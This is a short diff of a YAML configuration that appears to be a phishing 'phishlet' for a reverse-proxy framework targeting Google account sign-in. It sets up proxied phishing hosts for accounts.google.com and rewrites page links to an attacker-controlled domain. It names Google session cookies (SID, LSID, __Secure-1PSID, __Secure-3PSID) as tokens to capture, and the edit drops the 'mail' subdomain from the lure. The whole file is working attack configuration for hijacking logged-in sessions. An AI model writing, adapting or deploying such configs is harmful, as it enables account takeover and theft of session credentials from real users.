@@ -1,9 +1,9 @@
 name: 'google'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'mail', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'mail.{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
